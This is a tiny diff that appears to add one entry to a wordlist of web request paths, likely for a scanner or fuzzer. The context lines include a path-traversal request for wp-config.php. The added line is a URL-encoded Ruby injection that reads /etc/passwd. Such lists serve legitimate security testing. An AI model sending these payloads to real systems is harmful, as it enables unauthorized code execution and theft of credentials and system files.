@@ -309,3 +309,4 @@
 /api/project
 /wp-json/wooconvo/v1/download-file?order_id=1&filename=../../../../wp-config.php
 /api/version
+?IO.popen(%27cat%20%2Fetc%2Fpasswd%27).read%0A%23
